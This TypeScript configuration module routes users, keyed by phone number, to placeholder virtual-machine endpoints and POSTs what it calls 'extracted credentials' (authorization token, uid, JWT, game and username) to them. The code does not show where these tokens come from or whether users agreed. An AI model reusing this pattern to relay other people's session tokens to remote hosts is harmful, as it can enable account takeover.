// forwardingConfig.ts
// Configuration for routing users to different VMs based on phone numbers

interface VMConfig {
  url: string;
  name: string;
}

// Define your VM endpoints here
const VM_ENDPOINTS: { [key: string]: VMConfig } = {
  vm1: {
    url: "http://VM1_IP:3001/api/connect",
    name: "VM-1 (Primary)",
  },
  vm2: {
    url: "http://VM2_IP:3002/api/connect",
    name: "VM-2 (Secondary)",
  },
  vm3: {
    url: "http://VM3_IP:3003/api/connect",
    name: "VM-3 (Backup)",
  },
  default: {
    url: "http://DEFAULT_VM_IP:3000/api/connect",
    name: "VM-Default",
  },
};

/**
 * Determine which VM to use based on phone number
 * Customize this logic based on your routing needs
 */
export function getVMForPhone(phoneNumber: string): VMConfig {
  // Example routing logic:
  
  // Route by prefix (e.g., certain area codes)
  if (phoneNumber.startsWith("0801") || phoneNumber.startsWith("0802")) {
    return VM_ENDPOINTS.vm1;
  }
  
  if (phoneNumber.startsWith("0803") || phoneNumber.startsWith("0804")) {
    return VM_ENDPOINTS.vm2;
  }
  
  if (phoneNumber.startsWith("0805") || phoneNumber.startsWith("0806")) {
    return VM_ENDPOINTS.vm3;
  }
  
  // Route by last digit (load balancing)
  const lastDigit = parseInt(phoneNumber.slice(-1));
  if (lastDigit >= 0 && lastDigit <= 3) {
    return VM_ENDPOINTS.vm1;
  } else if (lastDigit >= 4 && lastDigit <= 6) {
    return VM_ENDPOINTS.vm2;
  } else if (lastDigit >= 7 && lastDigit <= 9) {
    return VM_ENDPOINTS.vm3;
  }
  
  // Default fallback
  return VM_ENDPOINTS.default;
}

/**
 * Forward extracted credentials to the appropriate VM
 */
export async function forwardToVM(
  username: string,
  game: string,
  pAuthorization: string,
  uid: string,
  jwt?: string
): Promise<{ success: boolean; error?: string; vmUsed?: string }> {
  const vmConfig = getVMForPhone(username);
  
  console.log(`\n🎯 Routing ${username} to ${vmConfig.name}`);
  console.log(`📡 Target: ${vmConfig.url}`);
  
  try {
    const payload = {
      pAuthorization,
      uid,
      game,
      username,
      jwt,
      timestamp: new Date().toISOString(),
    };
    
    console.log("📤 Sending payload:", {
      ...payload,
      pAuthorization: pAuthorization.substring(0, 10) + "...",
      jwt: jwt ? jwt.substring(0, 10) + "..." : null,
    });
    
    const response = await fetch(vmConfig.url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
      signal: AbortSignal.timeout(10000), // 10 second timeout
    });
    
    if (response.ok) {
      const result = await response.json();
      console.log(`✅ ${vmConfig.name} accepted connection:`, result);
      return { 
        success: true, 
        vmUsed: vmConfig.name 
      };
    } else {
      const errorText = await response.text();
      console.error(`❌ ${vmConfig.name} rejected (${response.status}):`, errorText);
      return { 
        success: false, 
        error: `VM error ${response.status}: ${errorText}`,
        vmUsed: vmConfig.name
      };
    }
  } catch (error: any) {
    console.error(`❌ Failed to connect to ${vmConfig.name}:`, error.message);
    return { 
      success: false, 
      error: `Connection failed: ${error.message}`,
      vmUsed: vmConfig.name
    };
  }
}

// Optional: Validate VM health before routing
export async function checkVMHealth(vmConfig: VMConfig): Promise<boolean> {
  try {
    const healthUrl = vmConfig.url.replace("/api/connect", "/health");
    const response = await fetch(healthUrl, { 
      method: "GET",
      signal: AbortSignal.timeout(3000) 
    });
    return response.ok;
  } catch {
    return false;
  }
}
